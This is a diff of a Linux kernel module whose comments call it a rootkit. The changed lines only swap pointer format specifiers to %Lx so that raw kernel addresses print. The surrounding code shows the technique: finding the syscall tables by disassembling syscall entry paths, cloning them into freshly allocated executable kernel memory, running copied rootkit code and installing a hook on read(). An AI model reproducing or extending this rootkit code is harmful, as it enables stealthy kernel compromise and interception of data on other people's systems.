@@ -217,7 +217,7 @@ int load(void) {
 	}
 
 	printk("kernel_tree = %d\n", kernel_tree);
-	printk("get_fs = %p\n", my_get_fs().seg);
+	printk("get_fs = %Lx\n", my_get_fs().seg);
 	//return -1;
 
 	/*
@@ -244,7 +244,7 @@ int load(void) {
 		return -2;
 	}
 
-	pinfo("Hurra! sys_call_table = %p, fastpath_location = %p, slowpath_location = %p, ia32_sys_call_table = %p, pia32sct = %p\n", sys_call_table, psct_fastpath, psct_slowpath,
+	pinfo("Hurra! sys_call_table = %Lx, fastpath_location = %Lx, slowpath_location = %Lx, ia32_sys_call_table = %Lx, pia32sct = %Lx\n", sys_call_table, psct_fastpath, psct_slowpath,
 			ia32_sys_call_table, pia32sct);
 
 	/*
@@ -253,7 +253,7 @@ int load(void) {
 	/*
 	   f_change_page_attr_set_clr = search_change_page_attr_set_clr(set_memory_x);
 	   if (f_change_page_attr_set_clr != NULL) {
-	   pinfo("Hurra! change_page_attr_set_clr() = %p\n", f_change_page_attr_set_clr);
+	   pinfo("Hurra! change_page_attr_set_clr() = %Lx\n", f_change_page_attr_set_clr);
 	   } else {
 	   perr("Sorry, can't find change_page_attr_set_clr().\n");
 	   return 0;
@@ -261,7 +261,7 @@ int load(void) {
 	 */
 	f__vmalloc_node_range = search___vmalloc_node_range(__vmalloc);
 	if (f__vmalloc_node_range != NULL) {
-		pinfo("Hurra! __vmalloc_node_range() = %p\n", f__vmalloc_node_range);
+		pinfo("Hurra! __vmalloc_node_range() = %Lx\n", f__vmalloc_node_range);
 	} else {
 		perr("Sorry, can't find __vmalloc_node_range().\n");
 		return -2;
@@ -280,14 +280,14 @@ int load(void) {
 	my_sct_pagelen = PAGE_ROUND_UP(my_sct_len * sizeof(long));
 	rseed(get_seconds());
 	module_load_offset = (rand32() % 1024 + 1) * PAGE_SIZE;
-	pinfo("module_load_offset = %x, addr would be = %p\n", module_load_offset, MODULES_VADDR + module_load_offset);
+	pinfo("module_load_offset = %x, addr would be = %Lx\n", module_load_offset, MODULES_VADDR + module_load_offset);
 	my_sct = f__vmalloc_node_range(my_sct_pagelen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_NOENC, 0, NUMA_NO_NODE, __builtin_return_address(0));
 	//my_sct = vmalloc(my_sct_pagelen);
 	if (my_sct == NULL) {
 		perr("Sorry, can't reserve memory with __vmalloc_node_range() for my_sct.\n");
 		return -2;
 	}
-	pinfo("reserved %d bytes at %p\n", my_sct_pagelen, my_sct);
+	pinfo("reserved %Lx bytes at %Lx\n", my_sct_pagelen, my_sct);
 
 	// zero memory
 	ret = safe_zero(my_sct, my_sct_pagelen);
@@ -304,7 +304,7 @@ int load(void) {
 		perr("Sorry, can't clone sys_call_table.\n");
 		return -2;
 	}
-	pinfo("my_sct = %p, len = %d\n", my_sct, my_sct_len);
+	pinfo("my_sct = %Lx, len = %d\n", my_sct, my_sct_len);
 
 	//sleep(ret);
 
@@ -328,7 +328,7 @@ int load(void) {
 		perr("Sorry, can't reserve memory for my_ia32sct.\n");
 		return -2;
 	}
-	pinfo("reserved %d bytes at %p.\n", my_sct_pagelen, my_ia32sct);
+	pinfo("reserved %d bytes at %Lx.\n", my_sct_pagelen, my_ia32sct);
 
 	//sleep(ret);
 
@@ -348,7 +348,7 @@ int load(void) {
 		// TODO: free memory
 		return -2;
 	}
-	pinfo("ia32_sct cloned at = %p\n", my_ia32sct);
+	pinfo("ia32_sct cloned at = %Lx\n", my_ia32sct);
 
 	//sleep(ret);
 
@@ -374,11 +374,11 @@ int load(void) {
 	/*
 	 * Insert out rootkit into memory.
 	 */
-	pinfo("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_start = %p, kernel_start_pagdown = %p\n", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));
+	pinfo("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_start = %Lx, kernel_start_pagdown = %Lx\n", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));
 	//kernel_addr = f_kmalloc(kernel_paglen, GFP_KERNEL);
 	kernel_addr = f__vmalloc_node_range(kernel_paglen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_EXEC_NOENC, 0, NUMA_NO_NODE, __builtin_return_address(0));
 	if (kernel_addr != NULL) {
-		pinfo("kernel_addr = %p, kernel_addr_pagdown = %p\n", kernel_addr, PAGE_ROUND_DOWN(kernel_addr));
+		pinfo("kernel_addr = %Lx, kernel_addr_pagdown = %Lx\n", kernel_addr, PAGE_ROUND_DOWN(kernel_addr));
 		/*
 		 * Make our rootkit code executable.
 		 */
@@ -401,7 +401,7 @@ int load(void) {
 		//pinfo("kernel_test execution from LKM successful.\n");
 
 		f_kernel_test = kernel_addr + ((unsigned long)&kernel_test - (unsigned long)&kernel_start);
-		//pinfo("f_kernel_test at %p\n", f_kernel_test);
+		//pinfo("f_kernel_test at %Lx\n", f_kernel_test);
 		f_kernel_test();
 		pinfo("f_kernel_test execution from allocated code, successful.\n");
 
@@ -427,7 +427,7 @@ void install_hooks(void) {
 	//HOOK64(__NR_recvfrom, KADDR(my_recvfrom64));
 	//HOOK32(__NR_recvfrom, KADDR(my_recvfrom32));
 	HOOK64(__NR_read, KADDR(my_read64));
-	//pinfo("my_read64 at %p\n", KADDR(my_read64));
+	//pinfo("my_read64 at %Lx\n", KADDR(my_read64));
 	pinfo("Hooks installed!\n");
 }
 
@@ -443,7 +443,7 @@ int safe_zero(void *dst, size_t len) {
 	char *cdst = dst;
 
 	for(; i < len; i++) {
-		//pinfo("writing %d byte(s) at %p\r", sizeof(zero), &cdst[i]);
+		//pinfo("writing %d byte(s) at %Lx\r", sizeof(zero), &cdst[i]);
 		ret = probe_kernel_write(&cdst[i], &zero, sizeof(zero));
 		if (ret != 0) {
 			return ret;
@@ -550,7 +550,7 @@ void *disass_search_inst_range_addr(void *addr, const char *inst, const char *fm
 						if ((dist >= from && dist <= to) || ((dist * -1) >= from && (dist * -1) <= to)) {
 							pos_count ++;
 							if (pos_count == position) {
-								pinfo("%s found! addr = %p\n", inst, addr_found);
+								pinfo("%s found! addr = %Lx\n", inst, addr_found);
 								*loc_addr = (void *) insn[j].address + (insn[j].size - sizeof(int));
 								cs_free(insn, count);
 								cs_close(&handle);
@@ -617,8 +617,8 @@ void *disass_search_inst_addr(void *addr, const char *inst, const char *fmt, siz
 						//pinfo("->>%s<<--\n", insn[j].op_str);
 						sscanf(insn[j].op_str, fmt, &addr_found);
 						//int r = kstrtou64(insn[j].op_str, 16, (u64 *)&addr_found);
-						//pinfo("r %d %p\n", r, addr_found);
-						pinfo("%s found! addr = %p\n", inst, addr_found);
+						//pinfo("r %d %Lx\n", r, addr_found);
+						pinfo("%s found! addr = %Lx\n", inst, addr_found);
 						*loc_addr = (void *) insn[j].address + (insn[j].size - sizeof(int));
 						cs_free(insn, count);
 						cs_close(&handle);
@@ -681,8 +681,8 @@ void *disass_search_opstr_addr(void *addr, const char *opstr, const char *fmt, s
 					if (pos_count == position) {
 						sscanf(insn[j].op_str, fmt, &addr_found);
 						//int r = kstrtou64(insn[j].op_str, 16, (u64 *)&addr_found);
-						//pinfo("r %d %p\n", r, addr_found);
-						pinfo("%s found! addr = %p\n", opstr, addr_found);
+						//pinfo("r %d %Lx\n", r, addr_found);
+						pinfo("%s found! addr = %Lx\n", opstr, addr_found);
 						*loc_addr = (void *) insn[j].address + (insn[j].size - sizeof(int));
 						cs_free(insn, count);
 						cs_close(&handle);
@@ -802,10 +802,10 @@ void *search_ia32sct_int80h(unsigned int **psct_addr) {
 	gate_desc *idt = NULL;
 
 	my_store_idt(&idtr);
-	pinfo("IDT address = %p, size = %d\n", idtr.address, idtr.size);
+	pinfo("IDT address = %Lx, size = %d\n", idtr.address, idtr.size);
 	idt = (gate_desc *) idtr.address;
 	ia32sct = (void *) (0xffffffffffffffff - (0 - (unsigned int)my_gate_offset(&idt[0x80])) + 1);
-	pinfo("int 0x80 handler address = %p\n", ia32sct);
+	pinfo("int 0x80 handler address = %Lx\n", ia32sct);
 	//ia32sct = disass_search_inst_addr(ia32sct, "call", "%lx", 0x100, 2, (void **)psct_addr);
 	tmp = disass_search_inst_range_addr(ia32sct, "call", "%lx", 0x300, 1, 0x500000, 0xa10000, (void **)psct_addr);
 	if (tmp != NULL) {
@@ -861,7 +861,7 @@ void *search_sct_fastpath(unsigned int **psct_addr) {
 		if (tmp) {
 			sct = tmp;
 			sct = (void *) ((long) sct * -1);
-			pinfo("found movq to stage2: %p\n", sct);
+			pinfo("found movq to stage2: %Lx\n", sct);
 			//disassemble(sct, 0x200);
 			tmp = disass_search_opstr_addr(sct, "(, %rax, 8)", "*-%x", 0x200, 1, (void **)psct_addr); // search for a direct call with offset
 			if (tmp == NULL) {
@@ -896,7 +896,7 @@ void *search_sct_slowpath(unsigned int **psct_addr) {
 	tmp = disass_search_inst_range_addr(sct, "call", "%lx", 0x300, 2, 0x500000, 0xa10000, (void **)psct_addr);
 	if (tmp != NULL) {
 		sct = tmp;
-		pinfo("do_syscall_64 maybe at %p\n", sct);
+		pinfo("do_syscall_64 maybe at %Lx\n", sct);
 		tmp = disass_search_inst_addr(sct, "call", "*-%lx(", 0x100, 1, (void **)psct_addr);
 		if (tmp != NULL) {
 			sct = tmp;
@@ -918,12 +918,12 @@ void *search_sct_slowpath(unsigned int **psct_addr) {
 		if (tmp) {
 			sct = tmp;
 			sct = (void *) ((long) sct * -1);
-			pinfo("found movq to stage2: %p\n", sct);
+			pinfo("found movq to stage2: %Lx\n", sct);
 			//disassemble(sct, 0x200);
 			tmp = disass_search_inst_range_addr(sct, "call", "%lx", 0x300, 2, 0x500000, 0xa10000, (void **)psct_addr);
 			if (tmp != NULL) {
 				sct = tmp;
-				pinfo("do_syscall_64 maybe at %p\n", sct);
+				pinfo("do_syscall_64 maybe at %Lx\n", sct);
 				disassemble(sct, 0x100);
 				tmp = disass_search_inst_addr(sct, "call", "*-%lx(", 0x100, 1, (void **)psct_addr);
 				if (tmp != NULL) {
@@ -1016,12 +1016,12 @@ mm_segment_t *search_addr_limit(void) {
 		if (*(long *)&cti[i] == 0x7ffffffff000) {
 			// We are in kernel < 4.8.x
 			printk("addr_limit offset %ld\n", i);
-			printk("cti               %p\n", cti);
+			printk("cti               %Lx\n", cti);
 			return (mm_segment_t *)(cti + i);
 		} else if (*(long *)&cts[i] == 0x7ffffffff000) {
 			// We are in kernel >= 4.8.x
 			printk("addr_limit offset %ld\n", i);
-			printk("cts               %p\n", cts);
+			printk("cts               %Lx\n", cts);
 			return (mm_segment_t *)(cts + i);
 		}
 	}
